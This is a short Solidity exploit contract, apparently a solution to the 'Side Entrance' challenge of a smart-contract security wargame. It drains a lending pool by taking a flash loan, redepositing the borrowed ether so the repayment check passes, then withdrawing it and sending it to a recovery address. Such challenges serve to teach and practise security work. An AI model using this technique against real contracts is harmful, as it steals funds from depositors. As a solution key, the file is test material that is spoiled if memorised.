// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Exp is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function exploit(SideEntranceLenderPool pool, address recovery) external payable {
        pool.flashLoan(ETHER_IN_POOL);
        
        pool.withdraw();

        (bool success, ) = recovery.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
